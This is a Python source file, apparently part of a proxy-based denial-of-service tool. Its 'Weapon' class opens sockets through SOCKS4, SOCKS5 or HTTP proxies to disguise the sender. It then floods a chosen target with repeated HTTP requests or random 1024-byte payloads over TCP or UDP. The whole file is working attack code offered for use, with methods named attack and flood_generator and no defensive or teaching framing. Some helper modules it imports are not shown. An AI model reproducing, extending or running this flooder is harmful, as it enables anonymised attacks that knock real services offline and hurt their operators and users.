from files.obserbable import *
from files.requests_generator import *
from files.targets_manager import *
import socket
import socks
import ssl
import string

logger = logging.getLogger('logger')

class Weapon(Observable):
    def __init__(self, config):
        Observable.__init__(self)
        self.__config = config

    def create_socket_using_socks_proxy(self, target, proxy):
        if target.PROTOCOL == 'udp':
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        else:    
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy.TYPE == 'socks4':
            s.set_proxy(socks.SOCKS4, proxy.IP, int(proxy.PORT))
        elif proxy.TYPE == 'socks5':
            s.set_proxy(socks.SOCKS5, proxy.IP, int(proxy.PORT))
        elif proxy.TYPE == 'https' and target.PROTOCOL == 'https':
            s.set_proxy(socks.HTTP, proxy.IP, int(proxy.PORT))
        else:
            raise Exception('Invalid proxy type')
        s.settimeout(self.__config.TIMEOUT)
        return s

    def flood_generator(self, target):
        res = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(1024))  
        return res

    def simple_url_request_generator(self, target):
        return Requests.gen_http_request(target)

    def extended_url_request_generator(self, target):
        return Requests.gen_http_request(target, head=Requests.get_extended_head(target))

    def attack_with_socket_and_generator(self, target, s, request_generator):
        try:
            for id in range(self.__config.MAX_SIMPLE_CONNECTION_REQUESTS):
                request = request_generator(target)
                sent = s.send(str.encode(request))
                if not sent:
                    self.notify(['packet was not sent'])
                else:
                    self.notify(['packet was sent', len(request)])
            s.close()
        except:
            self.notify(['packet was not sent'])
            s.close()

    def establish_connection_socks(self, target, proxy):
        s = self.create_socket_using_socks_proxy(target, proxy)
        try:
            s.connect((target.HOST, int(target.PORT)))
            if target.PROTOCOL == 'https':
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.load_default_certs()
                ss = ctx.wrap_socket(s, server_hostname = target.HOST)
            else:
                ss = s
            self.notify(['successfully connected to proxy', proxy])
            return ss
        except Exception as e:
            s.close()
            self.notify(['unable to connect to proxy'])
            return None
        return None

    def establish_connection_http(self, proxy):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.__config.TIMEOUT)
        try:
            s.connect((proxy.IP, int(proxy.PORT)))
            self.notify(['successfully connected to proxy', proxy])
        except Exception as e:
            self.notify(['unable to connect to proxy'])
            return None
        return s

    def attack_url_socks(self, target, proxy):
        s = self.establish_connection_socks(target, proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.simple_url_request_generator)

    def attack_url_http(self, target, proxy):
        s = self.establish_connection_http(proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.extended_url_request_generator)

    def attack_url_https(self, target, proxy):
        s = self.establish_connection_socks(target, proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.simple_url_request_generator)

    def attack_url_http_s(self, target, proxy):
        if target.PROTOCOL == 'http' and proxy.TYPE == 'http':
            self.attack_url_http(target, proxy)
        elif target.PROTOCOL == 'https' and proxy.TYPE == 'https':
            self.attack_url_https(target, proxy)
        else:
            logger.warning('Attack skipped (Target: {0}, Proxy: {1})'.format(target, proxy))

    def attack_url(self, target, proxy):
        if proxy.TYPE in ['socks4', 'socks5']:
            self.attack_url_socks(target, proxy)
        elif proxy.TYPE in ['http', 'https']:
            self.attack_url_http_s(target, proxy)
    
    def attack_unknown_protocol_socks(self, target, proxy):
        s = self.establish_connection_socks(target, proxy)
        if s != None:
            self.attack_with_socket_and_generator(target, s, self.flood_generator)

    def attack_unknown_protocol(self, target, proxy):
        if proxy.TYPE in ['socks4', 'socks5']:
            self.attack_unknown_protocol_socks(target, proxy)
        else:
            logger.warning('Attack skipped (Target: {0}, Proxy: {1})'.format(target, proxy))

    def attack(self, target, proxy):
        if target.PROTOCOL in ['http', 'https']:
            self.attack_url(target, proxy)
        else:
            self.attack_unknown_protocol(target, proxy)